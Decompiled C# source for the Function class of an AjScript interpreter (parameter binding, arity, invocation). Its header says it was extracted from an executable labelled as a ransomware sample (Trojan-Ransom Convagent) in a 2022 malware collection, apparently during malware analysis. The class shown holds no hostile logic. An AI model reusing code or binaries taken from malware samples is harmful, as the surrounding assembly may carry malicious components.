// Decompiled with JetBrains decompiler
// Type: AjScript.Language.Function
// Assembly: FUNCD, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 38B3918C-7BBD-4048-BF6D-F5A856A1A18A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.Win32.Convagent.gen-2f81e8b71640e7b5770deccc56c23d75240c34a5914dcb138ec2972e624a0f03.exe

using AjScript.Commands;

namespace AjScript.Language
{
  public class Function : DynamicObject, IFunction, ICallable, IObject
  {
    private string[] parameterNames;
    private ICommand body;
    private int arity;
    private IContext context;

    public Function(string[] parameterNames, ICommand body)
      : this(parameterNames, body, (IContext) null)
    {
    }

    public Function(string[] parameterNames, ICommand body, IContext context)
    {
      this.Function = (IFunction) this;
      this.SetValue("prototype", (object) new DynamicObject());
      this.parameterNames = parameterNames;
      this.body = body;
      this.arity = parameterNames != null ? parameterNames.Length : 0;
      this.context = context;
    }

    public int Arity => this.parameterNames != null ? this.parameterNames.Length : 0;

    public string[] ParameterNames => this.parameterNames;

    public ICommand Body => this.body;

    public IContext Context => this.context;

    public object Invoke(IContext context, object @this, object[] arguments)
    {
      IContext context1 = (IContext) new AjScript.Context(this.context);
      context1.DefineVariable(nameof (@this));
      context1.SetValue(nameof (@this), @this);
      context1.DefineVariable(nameof (arguments));
      context1.SetValue(nameof (arguments), (object) arguments);
      for (int index = 0; arguments != null && index < arguments.Length && index < this.Arity; ++index)
      {
        context1.DefineVariable(this.parameterNames[index]);
        context1.SetValue(this.parameterNames[index], arguments[index]);
      }
      if (this.Body != null)
        this.Body.Execute(context1);
      if (context1.ReturnValue != null)
        return context1.ReturnValue.Value;
      return @this != null ? @this : (object) Undefined.Instance;
    }

    public virtual object NewInstance(object[] parameters) => this.Invoke(this.context, (object) new DynamicObject((IFunction) this), parameters);
  }
}
